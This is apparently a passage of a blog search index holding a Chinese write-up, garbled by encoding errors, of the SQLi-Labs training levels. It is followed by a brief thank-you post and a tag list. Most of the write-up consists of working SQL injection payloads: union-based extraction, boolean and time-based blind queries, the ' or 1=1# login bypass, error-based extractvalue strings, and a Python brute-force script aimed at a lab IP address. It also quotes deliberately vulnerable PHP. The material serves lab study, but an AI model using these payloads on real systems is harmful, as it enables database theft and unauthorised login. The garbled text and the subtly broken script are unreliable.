å¥½åƒå•¥éƒ½æ²¡å˜ï¼Œä¸è¿‡åœ¨åç«¯çš„ä»£ç é‡Œå¯ä»¥çœ‹è§ç›¸å…³çš„é€»è¾‘ 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQLè¿”å›çš„æ˜¯ 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) ä½†å› ä¸ºåç«¯ä»£ç çš„è®¾è®¡ï¼Œåªèƒ½æ˜¾ç¤ºç¬¬ä¸€æ¡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è®©å‰é¢idæŒ‡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®,è¿™æ ·ç¬¬ä¸€æ¡æ•°æ®å°±åªä¼šè¿”å›ç©º 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) å¼€å§‹çˆ†é‡‘å¸æ•°æ®äº† ?id=-1â€™ union select 1,(select username from users limit 4,1),3 â€“+ å› ä¸ºselect username from usersä¼šè¿”å›å¤šæ¡æ•°æ®ï¼Œè¿™æ—¶å€™ä½¿ç”¨limitæ¥é™åˆ¶è¿”å›å“ªä¸€è¡Œ è¿™æ ·å­çˆ†ç ´æ•°æ®ä¸å¤Ÿçˆ½ï¼Œè¿˜å¾—æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªæ“ï¼Œå¤ªéº»çƒ¦äº†,ç›´æ¥ä¸Šgroup_concat() ?id=-1â€™ union select 1,(select group_concat(username) from users),3 â€“+ ä¸è¿‡è¿™æ˜¯å’±åœ¨ç¿»çœ‹äº†æºä»£ç ï¼Œå¹¶ä¸”çŸ¥é“è¿™äº›æ•°æ®çš„æƒ…å†µä¸‹åšå‡ºæ¥çš„ï¼Œåœ¨çœŸæ­£æ³¨å…¥çš„ç¯å¢ƒä¸‹ï¼Œå¾—éœ€è¦è·å–è¿™äº›æ•°æ®ï¼Œè¿™æ—¶å€™å°±éœ€è¦information_schemaè¿™ä¸ªæ•°æ®åº“äº† ?id=-1â€™ union select 1,(select group_concat(schema_name) from schemata),3 â€“+ å‘ç”Ÿä»€ä¹ˆäº‹äº†ï¼Ÿå¥½åƒæœ‰ç‚¹ä¸å¤ªå¯¹åŠ²å‘¢ã€‚å› ä¸ºè¿™é¢˜æ‰€åœ¨çš„æ•°æ®åº“æ˜¯securityï¼Œè€Œschemataæ˜¯åœ¨information_schemaè¿™ä¸ªæ•°æ®åº“ä¸‹é¢çš„ã€‚æˆ‘ä»¬éœ€è¦æ¢æˆinformation_schema.schemata ?id=-1â€™ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ æ•°æ®åº“çˆ†å‡ºæ¥äº†ï¼Œçˆ†è¡¨å ?id=-1â€™ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=â€securityâ€),3 â€“+ è¡¨åå‡ºæ¥äº†ï¼Œçˆ†å­—æ®µ ?id=-1â€™ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€usersâ€),3 â€“+ éœ€è¦çš„æ•°æ®éƒ½æœ‰äº†ï¼Œå’±å¯ä»¥ç›´æ¥æŠŠåº“ç»™è„±ä¸‹æ¥äº† Less-2 - Less-4è¿™å‡ é¢˜éƒ½ä¸€æ ·ï¼Œæ— éæ˜¯æ³¨å…¥ç‚¹å‘¨å›´åŒ…è£¹çš„ä¸œè¥¿ä¸ä¸€æ ·ï¼Œä¸å¤šèµ˜è¿°ï¼Œè¿‡ã€‚ Less-5 | å¸ƒå°”ç›²æ³¨ ?id=1 çœ‰æ¸…ç›®ç§€ï¼Œå•¥éƒ½æœ¨æœ‰ã€‚ ?id=1â€â€˜ä¸€é€šæµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°æœ‰äº†æŠ¥é”™ä¿¡æ¯ å¦‚ä½•åˆ©ç”¨æŠ¥é”™ä¿¡æ¯æ³¨å…¥å‘¢ï¼Ÿ ?id=1â€™ and 1 = 1 â€“+i ?id=2â€™ and 2 = 1 â€“+ é‚£æœ‰æ„æ€çš„å°±æ¥äº†ï¼Œå˜»å˜» 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) çˆ†æ•°æ®åº“ 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break æ›´æ”¹payloadæ¥çˆ†è¡¨ 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; æ›´æ”¹payload æ¥çˆ†å­—æ®µ 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips æ— ANDçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨^ Less 6-8 éƒ½å·®ä¸å¤šï¼Œå°±æ˜¯éœ€è¦å„ç§å¥‡å¦™çš„é—­åˆç•¥ Less 9è¿™é‡Œéœ€è¦æ—¶é—´ç›²æ³¨ï¼Œå’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šåªæ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ªif(a,sleep(10),1)åˆ¤æ–­ ?id=1â€™ and if(1=1,sleep(5),1)â€“+ åˆ¤æ–­å‚æ•°æ„é€ ã€‚ ?id=1â€™and if(length((select database()))&gt;9,sleep(5),1)â€“+ åˆ¤æ–­æ•°æ®åº“åé•¿åº¦ ?id=1â€™and if(ascii(substr((select database()),1,1))=115,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­æ•°æ®åº“å­—ç¬¦ ?id=1â€™and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰è¡¨åé•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­è¡¨å ?id=1â€™and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™))&gt;20,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­å­—æ®µåã€‚ ?id=1â€™ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)â€“+ åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦ ?id=1â€™ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)â€“+ é€ä¸€æ£€æµ‹å†…å®¹ã€‚ Less 10 ä¸€æ¨¡ä¸€æ ·ï¼Œç•¥Less 11 | ä¸‡èƒ½å¯†ç è¿™æ¬¡å¼€å§‹ï¼Œä¸æ˜¯getä¼ å‚äº†ï¼Œæ¢æˆPOSTä¼ å‚è¿˜ç»™äº†ä¸ªç™»å½•æ¡†ï¼Œå…ˆéšä¾¿ç©¿ä¸ªæ•°æ®åº·åº· è¿™æ—¶å€™æ‹¿å‡ºæˆ‘ä»¬çš„ç©¶ææ— æ•Œç‚«é…·ä¸‡èƒ½å¯†ç 1' or 1=1# å¥½äº†ï¼Œè¿™å°±è¿›å»äº† ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå’±æŠŠæºç ç¿»å¼€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //æ³¨æ„è¿™é‡Œ $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; å…³é”®ç‚¹åœ¨è¿™é‡Œ$result=mysql_query($sql); è¿™é‡Œçš„ç»“æœæ˜¯ç”¨sqlè¯­å¥çš„æŸ¥è¯¢ç»“æœæ¥ï¼Œæ‰€ä»¥åªéœ€è¦è®©è¯­å¥è¿”å›ä¸€ä¸ªçœŸå°±è¡Œäº†ï¼Œor 1 = 1ä½¿å¾—æ•´ä¸ªè¯­å¥æ’çœŸï¼Œè¿™å°±è®©æˆ‘ä»¬æˆåŠŸç™»é™†è¿›å»äº† ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ³¨å…¥è·å–ä¿¡æ¯äº†ã€‚ Less 12 -16 éƒ½å·®ä¸å¤šç•¥ Less 17 | æŠ¥é”™æ³¨å…¥è¿™é¢˜å¼€å§‹ä¸åŒäº†ï¼Œä½¿ç”¨çš„æ˜¯updateè€Œä¸æ˜¯select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} æŠ¥é”™æ³¨å…¥å¼€æ·¦ èƒ½è¿›è¡ŒæŠ¥é”™çš„å‡½æ•°extractvalue() æ¼”ç¤º: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1â€™ and (extractvalue(1,concat(0x5c,version(),0x5c)))# çˆ†ç‰ˆæœ¬ 1â€™ and (extractvalue(1,concat(0x5c,database(),0x5c)))# çˆ†æ•°æ®åº“ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# çˆ†è¡¨å 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),0x5c)))# çˆ†å­—æ®µå 1â€™ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=â€™admin1â€™) b) ,0x5c)))# çˆ†å­—æ®µå†…å®¹è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# çˆ†å­—æ®µå†…å®¹ã€‚ #### updatexml() #### group by","link":"/2022/10/06/sql/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"å¤ç°","slug":"å¤ç°","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"}],"categories":[]}